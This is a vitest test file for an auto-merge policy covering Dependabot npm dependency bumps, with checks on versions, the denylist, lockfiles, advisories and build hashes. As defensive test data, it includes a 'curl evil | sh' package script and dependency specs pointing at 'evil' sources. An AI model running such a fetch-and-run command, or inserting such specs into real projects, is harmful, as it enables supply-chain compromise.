// The auto-merge lane's decision logic. Every refusal has its own test: the lane is only as safe as the weakest one.
import { describe, expect, it } from "vitest";
import {
	bytesChanged,
	checkAuthor,
	checkFiles,
	checkLockfile,
	checkPackageJson,
	checkRepoFacts,
	checkRuns,
	checkVerdict,
	denied,
	evaluate,
	isBreaking,
	isDowngrade,
	matchAdvisories,
	parseVersion,
	requiredAgeDays,
} from "../../scripts/lib/automergePolicy.mjs";

const HASH_A = "a".repeat(64);
const HASH_B = "b".repeat(64);
const DENY = ["esbuild", "@codemirror/*", "obsidian"];
const entry = (version: string, extra: Record<string, unknown> = {}) => ({
	version,
	resolved: `https://registry.npmjs.org/x/-/x-${version}.tgz`,
	integrity: "sha512-abc",
	...extra,
});
const lock = (packages: Record<string, unknown>) => ({ lockfileVersion: 3, packages: { "": {}, ...packages } });

const config = { denylist: DENY, requiredChecks: ["validate"], artifacts: ["main.js"] };
const pr = {
	number: 7,
	user: { login: "dependabot[bot]" },
	head: { sha: "head1", ref: "dependabot/npm_and_yarn/foo-1.0.1", repo: { full_name: "o/r" } },
	base: { ref: "main", repo: { full_name: "o/r" } },
	draft: false,
};

function facts(over: Record<string, unknown> = {}) {
	return {
		config,
		repo: "o/r",
		pr,
		files: [{ filename: "package.json" }, { filename: "package-lock.json" }],
		basePackage: { name: "p", scripts: { build: "x" }, devDependencies: { foo: "^1.0.0" } },
		headPackage: { name: "p", scripts: { build: "x" }, devDependencies: { foo: "^1.0.1" } },
		baseLock: lock({ "node_modules/foo": entry("1.0.0") }),
		headLock: lock({ "node_modules/foo": entry("1.0.1") }),
		runs: [{ name: "validate", conclusion: "success" }],
		verdict: { pr: 7, headSha: "head1", baseSha: "base1", deterministic: true, artifacts: { "main.js": { base: HASH_A, head: HASH_A } } },
		baseSha: "base1",
		alerts: [],
		ages: { "foo@1.0.1": 20 },
		repoFacts: { minReleaseAge: true, cooldown: true, scriptsAllowed: false },
		paused: false,
		...over,
	};
}

describe("versions", () => {
	it("parses plain versions and rejects the rest", () => {
		expect(parseVersion("^1.2.3")).toEqual([1, 2, 3]);
		expect(parseVersion("v4.5.6-beta.1")).toEqual([4, 5, 6]);
		expect(parseVersion("latest")).toBeNull();
		expect(parseVersion(undefined)).toBeNull();
	});
	it("treats a major, a 0.x minor and the unparseable as breaking", () => {
		expect(isBreaking("1.2.3", "1.9.0")).toBe(false);
		expect(isBreaking("1.2.3", "2.0.0")).toBe(true);
		expect(isBreaking("0.21.0", "0.28.0")).toBe(true);
		expect(isBreaking("0.21.0", "0.21.5")).toBe(false);
		expect(isBreaking("x", "1.0.0")).toBe(true);
	});
	it("spots a downgrade", () => {
		expect(isDowngrade("1.2.3", "1.2.2")).toBe(true);
		expect(isDowngrade("1.2.3", "1.3.0")).toBe(false);
		expect(isDowngrade("1.2.3", "1.2.3")).toBe(false);
		expect(isDowngrade("x", "1.0.0")).toBe(true);
	});
	it("matches the denylist by name and by scope", () => {
		expect(denied("esbuild", DENY)).toBe(true);
		expect(denied("@codemirror/view", DENY)).toBe(true);
		expect(denied("vitest", DENY)).toBe(false);
	});
});

describe("checkPackageJson", () => {
	const base = { name: "p", scripts: { a: "1" }, devDependencies: { foo: "^1.0.0" }, overrides: { bar: "1.0.0" } };
	it("accepts a version bump", () => {
		expect(checkPackageJson(base, { ...base, devDependencies: { foo: "^1.1.0" } }, DENY)).toEqual([]);
	});
	it("refuses a change outside dependency versions", () => {
		expect(checkPackageJson(base, { ...base, scripts: { a: "curl evil | sh" } }, DENY)).toContain("package.json changed outside dependency versions");
	});
	it("refuses an added or removed dependency", () => {
		expect(checkPackageJson(base, { ...base, devDependencies: { foo: "^1.0.0", evil: "^1.0.0" } }, DENY).join()).toContain("added or removed");
	});
	it("refuses a denylisted, non-plain, major or downgraded bump", () => {
		const bump = (name: string, from: string, to: string) => checkPackageJson({ devDependencies: { [name]: from } }, { devDependencies: { [name]: to } }, DENY).join();
		expect(bump("esbuild", "0.28.0", "0.28.1")).toContain("denylist");
		expect(bump("foo", "^1.0.0", "github:evil/foo")).toContain("not a plain version range");
		expect(bump("foo", "^1.0.0", "^2.0.0")).toContain("major");
		expect(bump("foo", "^1.2.0", "^1.1.0")).toContain("downgrade");
	});
	it("allows an unchanged dependency to sit next to a changed one", () => {
		expect(checkPackageJson({ devDependencies: { a: "^1.0.0", b: "^1.0.0" } }, { devDependencies: { a: "^1.0.0", b: "^1.0.1" } }, DENY)).toEqual([]);
	});
	it("checks overrides at any depth", () => {
		expect(checkPackageJson(base, { ...base, overrides: { bar: "1.0.1" } }, DENY)).toEqual([]);
		expect(checkPackageJson(base, { ...base, overrides: { bar: { baz: "^2.0.0" } } }, DENY)).toEqual([]);
		expect(checkPackageJson(base, { ...base, overrides: { bar: "npm:evil@1.0.0" } }, DENY)).toContain("overrides: only plain semver ranges are allowed");
		expect(checkPackageJson(base, { ...base, overrides: { bar: { baz: "https://x/y.tgz" } } }, DENY)).toContain("overrides: only plain semver ranges are allowed");
		expect(checkPackageJson(base, { ...base, overrides: { bar: "$foo" } }, DENY)).toEqual([]);
		expect(checkPackageJson(base, { ...base, overrides: { bar: "." } }, DENY)).toEqual([]);
	});
	it("leaves overrides alone when they did not change", () => {
		expect(checkPackageJson({ overrides: { bar: "npm:x@1.0.0" } }, { overrides: { bar: "npm:x@1.0.0" } }, DENY)).toEqual([]);
	});
});

describe("checkLockfile", () => {
	it("lists the version changes and accepts a clean bump", () => {
		const result = checkLockfile(lock({ "node_modules/foo": entry("1.0.0") }), lock({ "node_modules/foo": entry("1.0.1") }), DENY);
		expect(result.problems).toEqual([]);
		expect(result.changes).toEqual([{ name: "foo", from: "1.0.0", to: "1.0.1" }]);
	});
	it("reports a new transitive package as a change", () => {
		const result = checkLockfile(lock({}), lock({ "node_modules/a/node_modules/bar": entry("2.0.0") }), DENY);
		expect(result.changes).toEqual([{ name: "bar", from: null, to: "2.0.0" }]);
	});
	it("ignores untouched entries and the root", () => {
		const same = lock({ "node_modules/foo": entry("1.0.0") });
		expect(checkLockfile(same, same, DENY)).toEqual({ problems: [], changes: [] });
	});
	it("uses the entry name for an aliased package", () => {
		const result = checkLockfile(lock({}), lock({ "node_modules/alias": entry("1.0.0", { name: "real" }) }), DENY);
		expect(result.changes[0]?.name).toBe("real");
	});
	it("refuses anything not from the registry, without integrity, linked, or with an install script", () => {
		const problems = (extra: Record<string, unknown>) => checkLockfile(lock({}), lock({ "node_modules/foo": { ...entry("1.0.0"), ...extra } }), DENY).problems.join();
		expect(problems({ resolved: "git+ssh://x/foo.git" })).toContain("not resolved from");
		expect(problems({ resolved: undefined })).toContain("not resolved from");
		expect(problems({ link: true })).toContain("not resolved from");
		expect(problems({ integrity: "sha1-x" })).toContain("no sha512 integrity");
		expect(problems({ integrity: undefined })).toContain("no sha512 integrity");
		expect(problems({ hasInstallScript: true })).toContain("install script");
	});
	it("refuses a denylisted package, a major, a downgrade and another lockfile version", () => {
		expect(checkLockfile(lock({ "node_modules/esbuild": entry("0.28.1") }), lock({ "node_modules/esbuild": entry("0.28.2") }), DENY).problems.join()).toContain("denylist");
		expect(checkLockfile(lock({ "node_modules/foo": entry("1.0.0") }), lock({ "node_modules/foo": entry("2.0.0") }), DENY).problems.join()).toContain("major");
		expect(checkLockfile(lock({ "node_modules/foo": entry("1.1.0") }), lock({ "node_modules/foo": entry("1.0.0") }), DENY).problems.join()).toContain("downgrade");
		expect(checkLockfile({ lockfileVersion: 2 }, { lockfileVersion: 2 }, DENY).problems).toContain("lockfileVersion is not 3");
	});
	it("does not call a metadata-only edit of an entry a version change", () => {
		const result = checkLockfile(lock({ "node_modules/foo": entry("1.0.0") }), lock({ "node_modules/foo": entry("1.0.0", { dev: true }) }), DENY);
		expect(result.changes).toEqual([]);
	});
});

describe("advisories and age", () => {
	const changes = [{ name: "foo", from: "1.0.0", to: "1.0.5" }];
	it("matches an open advisory whose patched version the PR reaches, and keeps the worst severity", () => {
		const alerts = [
			{ name: "foo", patched: "1.0.5", severity: "high" },
			{ name: "foo", patched: "1.0.4", severity: "critical" },
			{ name: "foo", patched: "1.0.6", severity: "critical" },
			{ name: "foo", patched: "", severity: "critical" },
			{ name: "other", patched: "1.0.0", severity: "critical" },
			{ name: "foo", patched: "1.0.1", severity: "low" },
		];
		expect(matchAdvisories(changes, alerts)).toEqual({ security: true, severity: "critical" });
	});
	it("keeps the first severity when a later alert is lower", () => {
		expect(matchAdvisories(changes, [{ name: "foo", patched: "1.0.1", severity: "high" }, { name: "foo", patched: "1.0.2", severity: "low" }])).toEqual({ security: true, severity: "high" });
	});
	it("is not security when nothing matches", () => {
		expect(matchAdvisories(changes, [])).toEqual({ security: false, severity: null });
	});
	it("ranks an unknown severity as lowest", () => {
		expect(matchAdvisories(changes, [{ name: "foo", patched: "1.0.1", severity: "weird" }, { name: "foo", patched: "1.0.1", severity: "low" }]).severity).toBe("low");
	});
	it("waits longer the less urgent the update", () => {
		expect(requiredAgeDays({ security: true, severity: "critical" })).toBe(0);
		expect(requiredAgeDays({ security: true, severity: "high" })).toBe(3);
		expect(requiredAgeDays({ security: false, severity: null })).toBe(14);
	});
});

describe("the small checks", () => {
	it("checkAuthor", () => {
		expect(checkAuthor(pr, "o/r")).toEqual([]);
		expect(checkAuthor({ ...pr, user: { login: "human" } }, "o/r")).toContain("author is not dependabot[bot]");
		expect(checkAuthor({ ...pr, head: { ...pr.head, repo: { full_name: "fork/r" } } }, "o/r")).toContain("head is not in this repository");
		expect(checkAuthor({ ...pr, base: { ...pr.base, repo: { full_name: "other/r" } } }, "o/r")).toContain("head is not in this repository");
		expect(checkAuthor({ ...pr, head: { ...pr.head, ref: "feat/x" } }, "o/r")).toContain("branch is not a Dependabot npm branch");
		expect(checkAuthor({ ...pr, draft: true }, "o/r")).toContain("PR is a draft");
		expect(checkAuthor({ ...pr, base: { ...pr.base, ref: "dev" } }, "o/r")).toContain("base is not main");
		expect(checkAuthor({ number: 1 }, "o/r").length).toBeGreaterThan(3);
	});
	it("checkFiles", () => {
		expect(checkFiles([{ filename: "package-lock.json" }])).toEqual([]);
		expect(checkFiles([{ filename: "package.json" }, { filename: "src/main.ts" }])).toEqual(["src/main.ts is outside the allowed files"]);
		expect(checkFiles([{ filename: ".github/workflows/ci.yml" }]).length).toBe(1);
		expect(checkFiles([])).toEqual(["PR changes no files"]);
	});
	it("checkRepoFacts", () => {
		expect(checkRepoFacts({ minReleaseAge: true, cooldown: true, scriptsAllowed: false })).toEqual([]);
		expect(checkRepoFacts({ minReleaseAge: false, cooldown: false, scriptsAllowed: true })).toHaveLength(3);
	});
	it("checkRuns treats a missing or failed job as red", () => {
		expect(checkRuns([{ name: "validate", conclusion: "success" }], ["validate"])).toEqual([]);
		expect(checkRuns([{ name: "validate", conclusion: "failure" }], ["validate"])).toHaveLength(1);
		expect(checkRuns([], ["validate"])).toHaveLength(1);
	});
});

describe("checkVerdict", () => {
	const good = facts().verdict;
	it("accepts a verdict for this PR, head and base", () => {
		expect(checkVerdict(good, pr, "base1", ["main.js"])).toEqual([]);
		expect(bytesChanged(good, ["main.js"])).toBe(false);
	});
	it("refuses a missing, foreign, stale or non-reproducible verdict", () => {
		expect(checkVerdict(undefined, pr, "base1", ["main.js"])).toEqual(["no build verdict"]);
		expect(checkVerdict("text", pr, "base1", ["main.js"])).toEqual(["no build verdict"]);
		expect(checkVerdict({ ...good, pr: 8 }, pr, "base1", ["main.js"])).toContain("verdict is for another PR");
		expect(checkVerdict({ ...good, headSha: "x" }, pr, "base1", ["main.js"])).toContain("verdict is for another head commit");
		expect(checkVerdict(good, pr, "moved", ["main.js"])).toContain("main moved since the build");
		expect(checkVerdict({ ...good, deterministic: false }, pr, "base1", ["main.js"]).join()).toContain("not reproducible");
	});
	it("refuses missing or malformed hashes", () => {
		expect(checkVerdict({ ...good, artifacts: {} }, pr, "base1", ["main.js"])).toEqual(["no hashes for main.js"]);
		expect(checkVerdict({ ...good, artifacts: { "main.js": { base: "zz", head: HASH_A } } }, pr, "base1", ["main.js"])).toEqual(["no hashes for main.js"]);
		expect(checkVerdict({ ...good, artifacts: { "main.js": { head: HASH_A } } }, pr, "base1", ["main.js"])).toEqual(["no hashes for main.js"]);
		expect(checkVerdict({ ...good, artifacts: { "main.js": { base: HASH_A } } }, pr, "base1", ["main.js"])).toEqual(["no hashes for main.js"]);
	});
	it("sees changed bytes in any artifact", () => {
		expect(bytesChanged({ artifacts: { "main.js": { base: HASH_A, head: HASH_A }, "styles.css": { base: HASH_A, head: HASH_B } } }, ["main.js", "styles.css"])).toBe(true);
	});
});

describe("evaluate", () => {
	it("merges a clean routine bump with identical bytes", () => {
		const result = evaluate(facts());
		expect(result).toMatchObject({ action: "merge", reasons: [], security: false });
	});
	it("merges a critical security fix at once", () => {
		const result = evaluate(facts({ alerts: [{ name: "foo", patched: "1.0.1", severity: "critical" }], ages: { "foo@1.0.1": 0.1 } }));
		expect(result).toMatchObject({ action: "merge", security: true, severity: "critical" });
	});
	it("makes a non-critical security fix wait three days, and a routine bump fourteen", () => {
		const high = evaluate(facts({ alerts: [{ name: "foo", patched: "1.0.1", severity: "high" }], ages: { "foo@1.0.1": 1 } }));
		expect(high.action).toBe("skip");
		expect(high.reasons.join()).toContain("minimum 3");
		expect(evaluate(facts({ ages: { "foo@1.0.1": 13 } })).reasons.join()).toContain("minimum 14");
	});
	it("refuses when the publish date is unknown", () => {
		expect(evaluate(facts({ ages: {} })).reasons).toContain("foo@1.0.1: publish date unknown");
	});
	it("refuses a PR that changes nothing in the dependencies", () => {
		const same = facts().baseLock;
		const result = evaluate(facts({ headLock: same, headPackage: facts().basePackage }));
		expect(result.reasons).toContain("no dependency version changes");
	});
	it("does not report an empty change twice when package.json alone has problems", () => {
		const result = evaluate(facts({ headLock: facts().baseLock, headPackage: { ...facts().headPackage, scripts: { build: "evil" } } }));
		expect(result.reasons).not.toContain("no dependency version changes");
		expect(result.action).toBe("skip");
	});
	it.each([
		["a non-dependabot author", { pr: { ...pr, user: { login: "human" } } }],
		["a file outside the allowed two", { files: [{ filename: "package.json" }, { filename: "src/main.ts" }] }],
		["red CI", { runs: [{ name: "validate", conclusion: "failure" }] }],
		["a stale head commit", { verdict: { ...facts().verdict, headSha: "old" } }],
		["a moved base", { baseSha: "moved" }],
		["a missing precondition", { repoFacts: { minReleaseAge: false, cooldown: true, scriptsAllowed: false } }],
		["a pause after a broken main", { paused: true }],
	])("skips on %s", (_name, over) => {
		const result = evaluate(facts(over));
		expect(result.action).toBe("skip");
		expect(result.reasons.length).toBeGreaterThan(0);
	});
	it("escalates a security fix that changes the shipped bytes", () => {
		const result = evaluate(
			facts({
				alerts: [{ name: "foo", patched: "1.0.1", severity: "critical" }],
				verdict: { ...facts().verdict, artifacts: { "main.js": { base: HASH_A, head: HASH_B } } },
			}),
		);
		expect(result.action).toBe("needs-beta");
		expect(result.reasons).toEqual(["the built artifact changed: this update ships to users"]);
	});
	it("only skips a routine bump that changes the shipped bytes", () => {
		const result = evaluate(facts({ verdict: { ...facts().verdict, artifacts: { "main.js": { base: HASH_A, head: HASH_B } } } }));
		expect(result.action).toBe("skip");
	});
	it("does not escalate a security fix that has another objection", () => {
		const result = evaluate(
			facts({
				alerts: [{ name: "foo", patched: "1.0.1", severity: "critical" }],
				runs: [],
				verdict: { ...facts().verdict, artifacts: { "main.js": { base: HASH_A, head: HASH_B } } },
			}),
		);
		expect(result.action).toBe("skip");
		expect(result.reasons.length).toBe(2);
	});
});
